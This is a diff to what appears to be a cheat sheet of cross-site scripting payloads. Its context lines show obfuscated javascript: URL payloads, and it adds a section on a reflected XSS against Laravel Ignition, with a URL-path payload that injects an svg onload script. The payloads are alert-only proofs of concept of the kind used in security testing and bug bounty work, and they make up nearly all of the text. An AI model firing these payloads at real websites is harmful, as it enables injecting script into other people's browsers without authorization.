@@ -163,3 +163,8 @@ javascript:/**/%0aalert()
 ```js
 url=%26%2302java%26%23115cript:alert(document.domain)
 ```
+## Laravel Ignition Reflected Cross-Site Scripting
+```js
+host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
+```
+![img](https://pbs.twimg.com/media/F-pD1E9bYAAo8IB?format=jpg&name=small)
